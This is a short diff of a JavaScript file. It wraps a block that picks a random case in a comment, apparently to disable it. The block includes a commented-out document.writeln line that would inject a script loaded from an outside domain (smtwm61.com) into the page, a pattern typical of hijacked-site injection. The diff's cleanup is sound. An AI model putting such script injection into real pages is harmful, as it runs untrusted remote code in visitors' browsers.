@@ -1,3 +1,5 @@
+/*
+
 var m = 2; 
 var n = Math.floor(Math.random() * m + 1)
 switch (n) {
@@ -14,3 +16,5 @@ switch (n) {
 		//document.writeln("<script src=\'https://smtwm61.com/yd.php?id=440\'></script>");
 		break;
 }
+
+*/
